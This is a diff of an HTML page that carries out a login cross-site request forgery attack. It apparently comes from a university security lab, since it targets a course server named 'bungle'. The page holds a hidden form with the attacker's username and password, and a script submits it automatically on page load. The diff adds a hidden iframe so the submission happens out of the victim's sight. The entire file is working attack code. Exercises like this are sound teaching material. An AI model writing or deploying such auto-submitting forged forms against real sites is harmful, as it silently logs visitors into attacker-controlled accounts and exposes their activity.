@@ -1,11 +1,13 @@
 <html>
- 
-        <form action="http://bungle.cs.virginia.edu/login" method="POST">
-            <input type="hidden" name="username" value="attacker" />
+    <form action="http://bungle.cs.virginia.edu/login" method="POST" target="hidden_iframe">
+		<input type="hidden" name="username" value="attacker" />
 		<input type="hidden" name="password" value="l33th4x" />
-        </form>
-        <script>
-            document.forms[0].submit();
-        </script>
-  
+    </form>
+	<iframe id="hidden_iframe" name="hidden_iframe" ></iframe>
+	<script>
+		document.getElementById("hidden_iframe").onload = function(e){console.log(document.getElementById("hidden_iframe").attributes);}
+	</script>
+	<script>
+		document.forms[0].submit();
+	</script>
 </html>
